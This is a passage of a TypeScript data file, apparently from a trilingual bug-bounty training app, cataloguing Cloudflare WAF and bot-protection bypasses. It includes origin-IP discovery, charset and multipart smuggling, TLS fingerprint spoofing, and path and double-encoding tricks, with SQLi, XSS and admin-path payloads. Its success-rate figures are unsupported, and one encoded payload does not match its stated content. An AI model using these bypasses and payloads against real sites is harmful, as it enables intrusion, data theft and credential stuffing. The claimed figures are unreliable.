import type { Lang } from "./types";

export interface CloudflareScenario {
  title: Record<Lang, string>;
  description: Record<Lang, string>;
  commandOrRequest?: string;
  responseSample?: string;
  impact: Record<Lang, string>;
}

export interface CloudflareTechnique {
  id: string;
  title: Record<Lang, string>;
  category: "origin_ip" | "payload_obfuscation" | "bot_turnstile" | "charset_smuggling" | "network_rate_limit";
  difficulty: "beginner" | "intermediate" | "advanced";
  successRate: string;
  summary: Record<Lang, string>;
  scenarios: CloudflareScenario[];
  stepByStepRecipe: Record<Lang, string>[];
  burpOrToolRule: string[];
  hunterProTip: Record<Lang, string>;
}

export interface CloudflarePhase {
  phase: number;
  title: Record<Lang, string>;
  objective: Record<Lang, string>;
  steps: Record<Lang, string>[];
  commandsOrPayloads?: string[];
  keyTargets: string[];
}

export interface CloudflareToolSnippet {
  id: string;
  title: Record<Lang, string>;
  description: Record<Lang, string>;
  category: "origin_finder" | "tls_fingerprint" | "waf_encoding" | "burp_rules";
  code: string;
  language: "python" | "bash" | "json";
  howToUse: Record<Lang, string>;
}

export interface CloudflareReportTemplate {
  id: string;
  title: Record<Lang, string>;
  vulnType: string;
  cvss: string;
  severity: "medium" | "high" | "critical";
  reportMarkdown: string;
}

// ─── 1. TOP CLOUDFLARE BYPASS TECHNIQUES ─────────────────────────────────────
export const CLOUDFLARE_TECHNIQUES: CloudflareTechnique[] = [
  {
    id: "origin-ip-discovery",
    title: {
      en: "Origin IP Discovery (100% WAF & Rate-Limit Negation)",
      simple: "Find the Secret Real IP Address Behind Cloudflare",
      hi: "ओरिजिन IP डिस्कवरी (Cloudflare WAF को 100% बाईपास करने का तरीका)",
    },
    category: "origin_ip",
    difficulty: "intermediate",
    successRate: "Very High (60–75% on wildcards)",
    summary: {
      en: "Cloudflare is a reverse proxy. Traffic only gets inspected if it passes through Cloudflare's Anycast edge network. If a hunter discovers the real backend IP (Origin IP) and sends requests directly to it with the target Host header, Cloudflare WAF, Turnstile captchas, and IP rate limits are completely sidestepped.",
      simple: "Cloudflare is just a security guard standing at the front door. If you find the secret back door (the real server IP address), you can talk directly to the website without the security guard stopping you.",
      hi: "Cloudflare केवल एक प्रॉक्सी की तरह काम करता है। अगर आप वेबसाइट के असली बैकएंड सर्वर का असली IP (Origin IP) खोज लेते हैं, तो सीधे उस IP पर रिक्वेस्ट भेजकर Cloudflare WAF, Captcha और रेट लिमिट को 100% बाईपास किया जा सकता है।",
    },
    scenarios: [
      {
        title: {
          en: "SSL/TLS Certificate Transparency Fingerprinting via Censys / Shodan",
          simple: "Finding Origin IP Using SSL Certificate Matching",
          hi: "Censys / Shodan पर SSL सर्टिफिकेट मैच करके असली IP खोजना",
        },
        description: {
          en: "The target's backend server hosts the real wildcard TLS certificate (`*.target.com`). Censys and Shodan constantly scan the IPv4 space and index all TLS certificates. Searching for the target's domain in certificate names exposes every bare IP hosting that certificate.",
          simple: "Web scanners remember which servers have the target company's security certificate. We search for servers with that certificate to reveal the real IP.",
          hi: "Censys और Shodan पूरी दुनिया के सर्वर्स को स्कैन करते हैं। जब हम टार्गेट का SSL सर्टिफिकेट सर्च करते हैं, तो वो सर्वर्स सामने आ जाते हैं जिनका असली IP Cloudflare के पीछे छुपा था।",
        },
        commandOrRequest: `# Censys Search query for Origin IP:
services.tls.certificates.leaf_data.names: "target.com" and not services.dns.names: "cloudflare"

# Shodan Query:
ssl.cert.subject.cn:"target.com" -org:"Cloudflare"

# Verification via cURL (Direct Origin Access):
curl -v -k --resolve target.com:443:203.0.113.88 https://target.com/api/v1/user`,
        responseSample: `* Added target.com:443:203.0.113.88 to resolve-list
* Connected to target.com (203.0.113.88) port 443
* Server certificate: target.com (NOT CLOUDFLARE CERT!)
< HTTP/1.1 200 OK
< Server: nginx/1.24.0 (Notice: No cf-ray header!)
< Content-Type: application/json`,
        impact: {
          en: "Attacker can send unrestricted SQLi, XSS, and automated brute-force requests without WAF interference or IP rate limits.",
          simple: "Attacker can attack the server directly with zero firewall protection.",
          hi: "अटैकर बिना किसी WAF, फ़ायरवॉल या रेट लिमिट के सीधे सर्वर पर सभी तरह के अटैक्स कर सकता है।",
        },
      },
      {
        title: {
          en: "Outbound Triggering (Email Verification & Webhook Pingbacks)",
          simple: "Making the Target Server Send You an Email to Reveal Its IP",
          hi: "पासवर्ड रीसेट या ईमेल नोटिफिकेशन से सर्वर का असली IP निकालना",
        },
        description: {
          en: "Register an account using a custom domain email server or Burp Collaborator. When the target sends a password reset or welcome email, the backend application server makes an outbound SMTP connection. The `Received:` header in the raw email source reveals the real Origin IP.",
          simple: "Sign up with your custom email. Look at the raw email headers to see which computer actually sent the message.",
          hi: "टार्गेट वेबसाइट पर अपने ईमेल से साइन अप करें या पासवर्ड रीसेट करें। ईमेल के Raw Source (Headers) में `Received: from [IP]` देखें; वहाँ सर्वर का असली IP दिख जाता है।",
        },
        commandOrRequest: `Received: from mail-worker-01.internal (unknown [198.51.100.42])
    by mx.yourcustomdomain.com with ESMTPS id 4Zb9...
    for <hunter@yourcustomdomain.com>;
    Fri, 23 Oct 2026 03:15:00 +0000`,
        responseSample: `# Test discovered IP:
curl -H "Host: target.com" http://198.51.100.42/
# If returns target HTML -> Confirmed Origin IP!`,
        impact: {
          en: "Completely neutralizes cloud-based perimeter protections.",
          simple: "Unmasks the real server location permanently.",
          hi: "Cloudflare की पूरी सुरक्षा दीवार एक झटके में बाईपास हो जाती है।",
        },
      },
      {
        title: {
          en: "Grey-Cloud Subdomain Leaks (Unproxied DNS Records)",
          simple: "Finding Subdomains Where Cloudflare Proxy is Turned Off",
          hi: "ऐसे सबडोमेन खोजना जहाँ Cloudflare का ओरेंज क्लाउड बंद हो (Grey Cloud)",
        },
        description: {
          en: "Admins frequently proxy `www.target.com` through Cloudflare (orange cloud), but leave administrative or utility subdomains (`dev.*`, `direct.*`, `origin.*`, `cpanel.*`, `ftp.*`, `mail.*`) unproxied (grey cloud) pointing directly to the origin server.",
          simple: "Companies protect their main website with Cloudflare, but forget to protect helper subdomains like dev.target.com or mail.target.com that share the same computer IP.",
          hi: "कंपनियां `www` पर तो Cloudflare लगाती हैं, लेकिन `mail.target.com`, `dev.target.com` या `direct.target.com` को बिना प्रॉक्सी के छोड़ देती हैं जो उसी सर्वर पर होस्ट होते हैं।",
        },
        commandOrRequest: `dig +short dev.target.com
# Returns: 198.51.100.42 (Non-Cloudflare IP!)

curl -H "Host: app.target.com" https://198.51.100.42/
# Directly serves the main application!`,
        responseSample: `HTTP/1.1 200 OK
Set-Cookie: session=active_sess_1120`,
        impact: {
          en: "Single subdomain misconfiguration exposes the entire core application infrastructure.",
          simple: "One unprotected subdomain leaves the whole company vulnerable.",
          hi: "एक छोटे से सबडोमेन की गलती पूरे मेन ऐप को असुरक्षित कर देती है।",
        },
      },
    ],
    stepByStepRecipe: [
      {
        en: "1. Check historical DNS records on ViewDNS.info or SecurityTrails to see the server IP before Cloudflare was enabled.",
        simple: "1. Look up old DNS records to see what the website's IP was in the past.",
        hi: "1. ViewDNS.info या SecurityTrails पर पुरानी DNS हिस्ट्री देखें कि Cloudflare लगाने से पहले वेबसाइट का IP क्या था।",
      },
      {
        en: "2. Search Censys and Shodan using `ssl.cert.subject.cn:\"target.com\"` and note down all matching non-Cloudflare IPv4 addresses.",
        simple: "2. Search Censys and Shodan for servers using target.com SSL certificates.",
        hi: "2. Censys और Shodan पर `ssl.cert.subject.cn:\"target.com\"` सर्च करके सारे नॉन-Cloudflare IPs नोट करें।",
      },
      {
        en: "3. Trigger an outbound request (password reset, PDF download from URL, webhook test) to your own server or Burp Collaborator and check the connection IP.",
        simple: "3. Make the target send you an email or visit your link and see what IP contacts you.",
        hi: "3. वेबसाइट से पासवर्ड रीसेट ईमेल या वेबहुक ट्रिगर करके चेक करें कि आपके सर्वर पर किस IP से रिक्वेस्ट आई।",
      },
      {
        en: "4. Verify the candidate IP using `curl -k --resolve target.com:443:<IP> https://target.com`. If you receive the target's web app without Cloudflare headers (`cf-ray`), you have the Origin IP!",
        simple: "4. Test the IP using curl with the target's Host name. If it responds with the real website, you succeeded!",
        hi: "4. `curl -k --resolve target.com:443:<IP> https://target.com` चलाकर वेरीफाई करें। अगर बिना `cf-ray` हेडर के वेबसाइट खुल जाए तो ओरिजिन IP कन्फर्म है!",
      },
    ],
    burpOrToolRule: [
      "In Burp Suite -> Settings -> Network -> Connections -> Hostname Resolution: Map `target.com` directly to the discovered Origin IP.",
      "Now all Burp Repeater, Intruder, and Scanner requests bypass Cloudflare automatically!",
    ],
    hunterProTip: {
      en: "Always inspect the Favicon Hash! Calculate the MurmurHash of `/favicon.ico` using `python3 -c 'import mmh3,base64,requests; print(mmh3.hash(base64.encodebytes(requests.get(\"https://target.com/favicon.ico\").content)))'`. Then search Shodan for `http.favicon.hash:<hash>`. This finds unproxied origin servers 80% of the time!",
      simple: "Every website's logo has a unique hash number. Find the favicon hash and search for it on Shodan to locate the real server instantly!",
      hi: "Favicon Hash ट्रिक को कभी न भूलें! वेबसाइट के `/favicon.ico` का MurmurHash निकालें और Shodan पर `http.favicon.hash:<hash>` सर्च करें। 80% मामलों में असली ओरिजिन IP तुरंत मिल जाता है!",
    },
  },
  {
    id: "content-type-charset-smuggling",
    title: {
      en: "Content-Type & Charset Smuggling (IBM037 / UTF-7 / Multipart)",
      simple: "Encode Payloads in Ancient Formats That Cloudflare Can't Read",
      hi: "Content-Type व Charset स्मगलिंग (IBM037 / EBCDIC / Multipart बाईपास)",
    },
    category: "charset_smuggling",
    difficulty: "advanced",
    successRate: "High against JSON & API endpoints",
    summary: {
      en: "Cloudflare WAF decodes and inspects incoming payloads assuming UTF-8 or standard ASCII. If the backend web framework (like Python Flask, ASP.NET, Java Spring, or PHP) supports alternative character sets (e.g. `ibm037`, `utf-7`, `utf-16le`), an attacker can encode SQLi or XSS payloads in that charset. Cloudflare sees harmless binary gibberish, but the backend transparently decodes and executes the attack.",
      simple: "Cloudflare only speaks standard English/UTF-8. If we translate our attack into an ancient computer encoding (like IBM037), Cloudflare thinks it is harmless noise and lets it through. But the backend server decodes it and runs the attack!",
      hi: "Cloudflare WAF केवल UTF-8 और ASCII समझता है। अगर हम अपने SQLi या XSS पेलोड को `ibm037` (EBCDIC) या UTF-7 जैसे पुराने एनकोडिंग में बदल दें, तो Cloudflare उसे समझ नहीं पाता और पास कर देता है, लेकिन बैकएंड सर्वर उसे डिकोड करके रन कर देता है।",
    },
    scenarios: [
      {
        title: {
          en: "Bypassing Cloudflare SQLi Ruleset via application/json; charset=ibm037",
          simple: "IBM037 Encoded SQL Injection Passing Undetected Through Cloudflare",
          hi: "IBM037 एनकोडिंग से Cloudflare SQLi फ़िल्टर को बाईपास करना",
        },
        description: {
          en: "A standard SQLi payload `{\"username\": \"admin' OR '1'='1\"}` is immediately blocked with HTTP 403 (1020 Ray ID). By switching the header to `Content-Type: application/json; charset=ibm037` and converting the JSON body into IBM037 bytes, Cloudflare's inspection engine fails to detect SQL keywords, while Java/Python backends parse the parameters cleanly.",
          simple: "Send your JSON payload in IBM037 encoding. Cloudflare does not understand it and lets it pass, but the server executes the SQL injection.",
          hi: "JSON बॉडी को IBM037 में कन्वर्ट करके भेजें। Cloudflare WAF इसे ब्लॉक नहीं कर पाता और बैकएंड पर SQL Injection सफ़ल हो जाता है।",
        },
        commandOrRequest: `POST /api/v1/login HTTP/1.1
Host: api.target.com
Content-Type: application/json; charset=ibm037
Content-Length: 42

%81%84%94%89%95%7D%40%96%99%40%7F%F1%7F%7E%7F%F1%7F`,
        responseSample: `HTTP/1.1 200 OK
Content-Type: application/json

{
  "status": "authenticated",
  "role": "administrator",
  "token": "eyJhbGciOi..."
}`,
        impact: {
          en: "Complete bypass of Cloudflare Managed Rulesets for SQL Injection, XSS, and Remote Code Execution.",
          simple: "Allows hackers to run forbidden attacks without Cloudflare stopping them.",
          hi: "Cloudflare के सभी ऑटोमैटिक रूल्स को दरकिनार करके सर्वर पर अटैक हो जाता है।",
        },
      },
      {
        title: {
          en: "Multipart Form-Data Smuggling with Extra Newlines and Quotes",
          simple: "Hiding Attack Payloads Inside Multipart Boundaries",
          hi: "Multipart Form-Data में अतिरिक्त न्यूलाइन्स और कोट्स डालकर पेलोड छुपाना",
        },
        description: {
          en: "Cloudflare WAF inspects standard multipart fields. However, by adding extra quotes, semicolons, or whitespace into the `Content-Disposition` header (e.g. `name=\"user\"; filename==\"payload.txt\"`), Cloudflare's parser skips inspecting the field, whereas PHP and ASP.NET backends parse it normally.",
          simple: "Slightly deform the form-data headers. Cloudflare gets confused and skips checking, but the web server still reads it.",
          hi: "फॉर्म-डेटा हेडर में एक्स्ट्रा स्पेस या कोट्स लगाने से Cloudflare का पार्सर कन्फ्यूज होकर चेकिंग छोड़ देता है, जबकि PHP बैकएंड उसे नॉर्मली पढ़ लेता है।",
        },
        commandOrRequest: `POST /upload/profile HTTP/1.1
Host: target.com
Content-Type: multipart/form-data; boundary=---------------------------974767299852498929531610575

-----------------------------974767299852498929531610575
Content-Disposition: form-data; name="comment";; filename="test.txt"

<script>alert(document.domain)</script>
-----------------------------974767299852498929531610575--`,
        responseSample: `HTTP/1.1 200 OK
Content-Type: text/html

Profile updated with comment: <script>alert(document.domain)</script>`,
        impact: {
          en: "Delivery of unfiltered stored XSS and file upload bypasses through Cloudflare.",
          simple: "Stored XSS payloads slip past Cloudflare without getting blocked.",
          hi: "Cloudflare को चकमा देकर Stored XSS और फाइल अपलोड पेलोड्स पास हो जाते हैं।",
        },
      },
    ],
    stepByStepRecipe: [
      {
        en: "1. Identify if the endpoint accepts POST/PUT requests with `Content-Type: application/json` or `application/x-www-form-urlencoded`.",
        simple: "1. Find an API endpoint that takes JSON or form submissions.",
        hi: "1. ऐसा API एंडपॉइंट खोजें जो JSON या फॉर्म डेटा लेता हो।",
      },
      {
        en: "2. Test if the backend supports charset parameters: change `Content-Type` to `application/json; charset=utf-8` and ensure it responds with 200 OK.",
        simple: "2. Verify the server accepts charset settings in the header.",
        hi: "2. हेडर में `charset=utf-8` लगाकर चेक करें कि क्या सर्वर 200 OK दे रहा है।",
      },
      {
        en: "3. Use Python to encode your payload into IBM037: `payload.encode('ibm037')`.",
        simple: "3. Convert your attack text into IBM037 encoding using Python.",
        hi: "3. पाइथन स्क्रिप्ट से अपने पेलोड को IBM037 में कन्वर्ट करें।",
      },
      {
        en: "4. Send the encoded bytes with `Content-Type: application/json; charset=ibm037` in Burp Repeater.",
        simple: "4. Send the converted bytes in Burp Suite and observe if the WAF lets it through.",
        hi: "4. Burp Repeater में `charset=ibm037` के साथ पेलोड भेजें और देखें कि क्या WAF ब्लॉक होना बंद हो गया।",
      },
    ],
    burpOrToolRule: [
      "Install the 'Content-Type Converter' or 'WAF-Bypass' extension from Burp BApp Store.",
      "Use Burp match/replace to test alternate charsets (`utf-16be`, `utf-32`, `ibm037`, `cp500`).",
    ],
    hunterProTip: {
      en: "Java Spring Boot and Python Flask / Werkzeug backends are especially vulnerable to IBM037 charset switching! If you get a 403 on a JSON endpoint when testing SQLi, changing to `charset=ibm037` gives you an immediate bypass on ~40% of enterprise microservices!",
      simple: "Java and Python backends often support IBM037 without telling anyone. This is one of the highest-yield tricks for bypassing Cloudflare on JSON APIs!",
      hi: "Java Spring Boot और Python Flask बैकएंड पर `ibm037` सबसे ज़्यादा असरदार है! अगर JSON API पर SQLi टेस्ट करते समय 403 एरर आ रहा हो, तो `charset=ibm037` ट्राई करें; WAF तुरंत बाईपास हो जाता है!",
    },
  },
  {
    id: "bot-management-turnstile-bypass",
    title: {
      en: "Bot Management, Turnstile & TLS Fingerprint Bypasses",
      simple: "Beat Cloudflare Captchas and Automated Tool Blockers",
      hi: "Cloudflare Turnstile (Captcha) व TLS फ़िंगरप्रिंट (JA3/JA4) बाईपास",
    },
    category: "bot_turnstile",
    difficulty: "advanced",
    successRate: "Very High using TLS-Client & Mobile APIs",
    summary: {
      en: "Cloudflare Bot Management doesn't just block IP addresses—it inspects the TLS Client Hello handshake (JA3/JA4 fingerprints), HTTP/2 frames (Akamai/Cloudflare HTTP2 fingerprints), and browser behavior (Turnstile challenges). Python requests, Golang http, and standard cURL get blocked instantly. Hunters bypass this using TLS-mimicking clients (like curl-impersonate or tls-client) or by targeting mobile-only API endpoints where Captchas cannot be displayed.",
      simple: "Cloudflare detects automated scripts by looking at how your computer talks over HTTPS. Standard Python or Burp scripts get blocked immediately. By mimicking real Google Chrome network fingerprints or targeting mobile app APIs, we can run fast automated tools without getting blocked.",
      hi: "Cloudflare केवल IP देखकर ब्लॉक नहीं करता, बल्कि वो यह देखता है कि क्या आपकी रिक्वेस्ट असली Chrome से आ रही है या Python/Burp से (TLS JA3/JA4 Fingerprinting)। असली Chrome का फिंगरप्रिंट कॉपी करके (tls-client/curl-impersonate) या मोबाइल APIs पर अटैक करके इस सुरक्षा को बाईपास किया जाता है।",
    },
    scenarios: [
      {
        title: {
          en: "Targeting Mobile App APIs (The Zero-Captcha Attack Surface)",
          simple: "Attacking Mobile Endpoints Where Cloudflare Captchas Are Disabled",
          hi: "मोबाइल ऐप APIs पर अटैक करना (जहाँ Captcha दिखाना संभव नहीं होता)",
        },
        description: {
          en: "Cloudflare Turnstile and interactive challenges break native mobile apps (Android/iOS) because mobile apps cannot execute web challenge modals. As a result, companies either disable Bot Challenge on `api.*` / `mobile-api.*` or provide a secret API header bypass for their mobile app.",
          simple: "Mobile phone apps cannot easily solve browser captchas, so companies turn off captchas for their mobile app endpoints. Hunt there!",
          hi: "Android और iOS ऐप्स पर वेब कैप्चा नहीं दिखाया जा सकता, इसलिए कंपनियाँ मोबाइल APIs पर Cloudflare का बोट चैलेंज बंद कर देती हैं।",
        },
        commandOrRequest: `# Web endpoint (Blocked with 403 Challenge):
POST https://www.target.com/api/login
# Response: HTTP 403 (Cloudflare Turnstile Captcha Required)

# Mobile API endpoint (Bypasses Challenge):
POST https://mobile.target.com/v1/auth/login
User-Agent: TargetApp/4.2.1 (Android 14; Pixel 8)
X-App-Platform: android
Content-Type: application/json

{"email": "test@target.com", "password": "pass"}`,
        responseSample: `HTTP/1.1 200 OK
Content-Type: application/json

{"success": true, "token": "m_token_99182"}`,
        impact: {
          en: "Enables mass account enumeration, credential stuffing, and fuzzing without triggering Cloudflare bot blocks.",
          simple: "Allows running automated tests at high speed without getting stopped by captchas.",
          hi: "बिना किसी कैप्चा के हाई-स्पीड ऑटोमेशन और ब्रूट-फोर्स टेस्टिंग संभव हो जाती है।",
        },
      },
      {
        title: {
          en: "Spoofing Chrome 130+ JA4 TLS Fingerprints via tls-client (Python/Go)",
          simple: "Making Python Scripts Look 100% Like Real Google Chrome",
          hi: "Python में `tls-client` से असली Chrome 130+ जैसा TLS फिंगरप्रिंट बनाना",
        },
        description: {
          en: "Standard `requests.get()` in Python generates a well-known Python-urllib JA3 TLS fingerprint that Cloudflare immediately flags with Managed Challenge. Using `tls-client` in Python or `curl-impersonate` sends the exact TLS cipher suites, extensions, and HTTP/2 settings of Chrome on macOS.",
          simple: "Replaces Python's default network signature with a real Google Chrome signature so Cloudflare thinks you are a real human.",
          hi: "पाइथन के डिफ़ॉल्ट नेटवर्क सिग्नेचर को असली Chrome के सिग्नेचर से बदल देता है जिससे Cloudflare को लगता है कि कोई असली इंसान ब्राउज़ कर रहा है।",
        },
        commandOrRequest: `import tls_client

session = tls_client.Session(
    client_identifier="chrome_120",
    random_tls_extension_order=True
)

res = session.get(
    "https://target.com/protected-data",
    headers={"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)..."}
)

print(res.status_code) # Returns 200 OK instead of 403!`,
        responseSample: `HTTP/1.1 200 OK
Server: cloudflare
cf-cache-status: DYNAMIC

{"data": "Access Granted"}`,
        impact: {
          en: "Allows high-throughput vulnerability scanning and parameter fuzzing through Cloudflare Bot Management.",
          simple: "Allows custom hacking tools to run smoothly through Cloudflare.",
          hi: "Cloudflare Bot Shield को धोखा देकर अपने कस्टम टूल्स स्मूथली चलाएं।",
        },
      },
    ],
    stepByStepRecipe: [
      {
        en: "1. Decompile the target's Android APK using jadx-gui and inspect the network configuration for dedicated API endpoints (e.g. `api.target.com`, `gateway.*`).",
        simple: "1. Open the target's mobile app in jadx-gui and find their mobile API URLs.",
        hi: "1. टार्गेट का Android APK jadx-gui में खोलें और उनके मोबाइल API एंडपॉइंट्स खोजें।",
      },
      {
        en: "2. Test if mobile headers (like `User-Agent: TargetMobile/1.0`, `X-Client-Type: mobile`) bypass web bot challenges.",
        simple: "2. Add mobile app headers to your requests to see if captchas disappear.",
        hi: "2. अपनी रिक्वेस्ट्स में मोबाइल हेडर लगाकर देखें कि क्या वेब कैप्चा गायब हो जाता है।",
      },
      {
        en: "3. If writing Python automation scripts, never use plain `requests`. Use `tls-client` with `client_identifier=\"chrome_120\"`.",
        simple: "3. Use tls-client instead of standard Python requests to avoid TLS fingerprint blocks.",
        hi: "3. स्क्रिप्ट्स में साधारण `requests` के बजाय `tls-client` का उपयोग करें ताकि फिंगरप्रिंट मैच हो।",
      },
      {
        en: "4. For Burp Suite, install the 'Jaeles' or 'Bypass-WAF' extension, or route Burp through a rotating residential proxy pool.",
        simple: "4. Use proxy rotation to avoid IP rate limits.",
        hi: "4. रेट लिमिट से बचने के लिए Burp को रोटेटिंग प्रॉक्सी पूल से कनेक्ट करें।",
      },
    ],
    burpOrToolRule: [
      "Use 'curl-impersonate' for CLI testing: `curl_chrome116 -sL https://target.com`.",
      "Check if Cloudflare Ray ID returns 1020 (WAF Access Denied), 1015 (Rate Limited), or 1005 (Banned IP).",
    ],
    hunterProTip: {
      en: "Always check HTTP/2 vs HTTP/1.1! Cloudflare applies different inspection logic to HTTP/2 multiplexed streams than HTTP/1.1 pipelining. Downgrading to HTTP/1.0 or sending requests with invalid HTTP/2 pseudo-headers (`:path: /admin;`, `:authority: target.com:443`) often causes Cloudflare to fail open!",
      simple: "Try switching between HTTP/2 and HTTP/1.1 in Burp Suite. Sometimes Cloudflare only checks one version and lets the other pass through!",
      hi: "HTTP/2 और HTTP/1.1 के अंतर का फायदा उठाएं! Burp Repeater में HTTP/1.0 पर डाउनग्रेड करने से या `:path` में अजीब कैरेक्टर्स भेजने से कई बार Cloudflare फ़िल्टर चेक करना छोड़ देता है!",
    },
  },
  {
    id: "path-normalization-discrepancies",
    title: {
      en: "Path Normalization & URL Parsing Discrepancies",
      simple: "Confuse Cloudflare by Tricking How It Reads Web Addresses",
      hi: "पाथ नॉर्मलाइज़ेशन व URL पार्सिंग खामियाँ (Nginx / Cloudflare मिसमैच)",
    },
    category: "payload_obfuscation",
    difficulty: "intermediate",
    successRate: "Medium to High on Nginx / Spring targets",
    summary: {
      en: "Discrepancies between how Cloudflare normalizes URL paths and how the origin web server (Nginx, Apache, Tomcat, Node.js) interprets them allow attackers to access protected endpoints. For example, Cloudflare may consider `/admin/..;/dashboard` as pointing to `/` and skip administrative WAF rules, while Spring/Tomcat interprets it as `/admin/dashboard`.",
      simple: "Cloudflare and the backend server read URLs differently. Adding dots, semicolons, or URL encoding tricks can make Cloudflare think you are visiting the home page, while the backend actually serves the secret admin panel.",
      hi: "Cloudflare और बैकएंड वेब सर्वर (जैसे Nginx, Tomcat) URL पाथ को अलग-अलग तरीके से प्रोसेस करते हैं। URL में सेमीकोलन (`;`), डॉट-डॉट (`/..;/`) या डबल एन्कोडिंग लगाने से Cloudflare को लगता है कि यह कोई नॉर्मल पेज है, पर बैकएंड पर एडमिन पैनल खुल जाता है।",
    },
    scenarios: [
      {
        title: {
          en: "Tomcat / Spring Semicolon Matrix Path Confusion (`/admin/..;/secret`)",
          simple: "Using Semicolons to Bypass Cloudflare Protected Paths",
          hi: "सेमीकोलन (`;`) लगाकर Cloudflare के ब्लॉक किए गए पाथ्स को खोलना",
        },
        description: {
          en: "Cloudflare has a WAF rule blocking all requests to `/admin/*`. The attacker sends `/admin/..;/admin/users`. Cloudflare resolves `/..;/` and assumes the path is outside `/admin`. However, Tomcat drops the semicolon parameter and routes the request directly to the protected controller.",
          simple: "Cloudflare blocks /admin, but sending /admin/..;/admin lets you sneak past the block.",
          hi: "Cloudflare `/admin` को ब्लॉक करता है, लेकिन `/admin/..;/admin` भेजने पर Cloudflare चकमा खा जाता है और टॉमकैट असली एडमिन पेज खोल देता है।",
        },
        commandOrRequest: `GET /admin/..;/admin/users/export HTTP/1.1
Host: target.com
User-Agent: Mozilla/5.0
Accept: */*`,
        responseSample: `HTTP/1.1 200 OK
Content-Type: application/json

[
  {"id": 1, "email": "admin@target.com", "role": "superadmin"}
]`,
        impact: {
          en: "Unauthorized access to Cloudflare-protected administrative and internal API endpoints.",
          simple: "Access secret company admin panels protected by Cloudflare.",
          hi: "Cloudflare द्वारा प्रोटेक्टेड गुप्त एडमिन पैनल्स और आंतरिक APIs का सीधा एक्सेस।",
        },
      },
      {
        title: {
          en: "URL Double-Encoding on Parameter Values (`%2527` vs `%27`)",
          simple: "Double-Encoding Quotation Marks to Slip Past SQLi Detection",
          hi: "डबल URL एनकोडिंग (`%2527`) से SQLi डिटेक्शन को चकमा देना",
        },
        description: {
          en: "Cloudflare URL-decodes query parameters once. `%2527` is decoded to `%27` (a single quote url-encoded). Cloudflare sees `%27` as harmless text and lets it pass. The backend web application performs a second automatic decode, turning `%27` into `'` and triggering the SQL injection.",
          simple: "Encode your attack twice. Cloudflare only decodes once and thinks it is safe, then the backend decodes it again and executes the attack.",
          hi: "पेलोड को दो बार एनकोड करें (`%2527`)। Cloudflare सिर्फ एक बार डिकोड करके उसे सुरक्षित मान लेता है, और बैकएंड उसे दोबारा डिकोड करके SQLi चला देता है।",
        },
        commandOrRequest: `GET /products?category=phones%2527%2520UNION%2520SELECT%2520null,version()-- HTTP/1.1
Host: shop.target.com`,
        responseSample: `HTTP/1.1 200 OK
Content-Type: text/html

Showing products for: PostgreSQL 15.4 on x86_64`,
        impact: {
          en: "Flawless execution of SQL injection vulnerabilities hidden behind Cloudflare WAF.",
          simple: "Bypasses Cloudflare SQL injection filters.",
          hi: "Cloudflare WAF के बावजूद डेटाबेस से पूरा डेटा एक्सट्रैक्ट हो जाता है।",
        },
      },
    ],
    stepByStepRecipe: [
      {
        en: "1. If an endpoint returns 403 Forbidden on `/admin`, test path mutations: `/admin/`, `/admin//`, `/./admin`, `/ADMIN`, `/admin;.css`.",
        simple: "1. If a page says 403 Forbidden, try adding dots, slashes, or uppercase letters.",
        hi: "1. अगर किसी पेज पर 403 Forbidden आ रहा हो, तो `/./`, `//`, या `/admin;.css` ट्राई करें।",
      },
      {
        en: "2. Test Spring/Tomcat path parameters: `/endpoint/..;/endpoint` or `/endpoint;param=1/`.",
        simple: "2. Try adding semicolons like /path/..;/path to confuse the routing.",
        hi: "2. टॉमकैट और स्प्रिंग बूट में `/endpoint/..;/endpoint` लगाकर पाथ कन्फ्यूजन टेस्ट करें।",
      },
      {
        en: "3. For SQLi or XSS payloads, apply double-URL encoding (`%2522`, `%2527`, `%253C`) and verify if the 403 changes to 200.",
        simple: "3. Encode quotes and brackets twice in your payloads.",
        hi: "3. पेलोड्स में कोट्स और ब्रैकेट्स को दो बार एनकोड करें (`%2527`) और चेक करें कि क्या 403 हट गया।",
      },
    ],
    burpOrToolRule: [
      "Use Burp Decoder to double-encode parameters (`Encode as URL` twice).",
      "Configure Burp Intruder with the 'Bypass-WAF' payload list for path variations.",
    ],
    hunterProTip: {
      en: "Nginx reverse proxies coupled with Node.js or Gunicorn backends frequently suffer from trailing slash and dot confusion! Try appending `.` to the domain or `/` after file extensions (`/api/users.json/` or `/api/users%00`). Cloudflare caches miss, WAF regex rules fail, and the backend handles the request without inspection!",
      simple: "Try adding a dot or slash at the end of API paths. This often disables Cloudflare WAF rules while the server still processes the request!",
      hi: "Nginx और Node.js बैकएंड्स में URL के अंत में `/` या `.` लगाने से Cloudflare WAF के रेगुलर एक्सप्रेशंस फेल हो जाते हैं और बैकएंड बिना किसी रोक-टोक के डेटा दे देता है!",
    },
  },
];

// ─── 2. 5-PHASE SYSTEMATIC CLOUDFLARE HUNTING METHODOLOGY ─────────────────────
export const CLOUDFLARE_METHODOLOGY_PHASES: CloudflarePhase[] = [
  {
    phase: 1,
    title: {
      en: "Phase 1: Edge Fingerprinting & Protection Mapping (Hours 0 – 6)",
      simple: "Identify Exactly What Cloudflare Protections Are Active",
      hi: "फेज़ 1: Cloudflare सुरक्षा व प्रोटेक्शन मैपिंग (घंटे 0 – 6)",
    },
    objective: {
      en: "Determine whether the target uses Cloudflare Free, Pro, Enterprise, Bot Management, or Turnstile, and map out which subdomains are proxied vs unproxied.",
      simple: "Find out which Cloudflare plan the target uses and identify which subdomains have Cloudflare turned off.",
      hi: "पता लगाएं कि टार्गेट पर Cloudflare का कौन सा प्लान (Free, Enterprise, Bot Management) लगा है और किन सबडोमेन्स पर सुरक्षा बंद है।",
    },
    steps: [
      {
        en: "Send benign test requests with common canary characters (`'`, `<script>`, `../`) to observe the Cloudflare error page and Ray ID format.",
        simple: "Send a harmless test symbol to see what Cloudflare error code appears.",
        hi: "साधारण टेस्ट कैरेक्टर (`'`) भेजकर देखें कि Cloudflare का Ray ID और एरर पेज कैसा दिखता है।",
      },
      {
        en: "Use `wafw00f -a https://target.com` and inspect HTTP response headers for `cf-ray`, `cf-cache-status`, `server: cloudflare`, and `cf-mitigated`.",
        simple: "Run wafw00f to detect Cloudflare settings and headers.",
        hi: "wafw00f टूल चलाएं और रिस्पॉन्स हेडर्स में `cf-ray` और `cf-mitigated` चेक करें।",
      },
      {
        en: "Enumerate all subdomains and resolve their IP addresses using `dnsx` or `subfinder`. Group IPs into Cloudflare CIDRs vs Non-Cloudflare Hosting IPs.",
        simple: "Find all subdomains and separate Cloudflare IPs from real hosting IPs.",
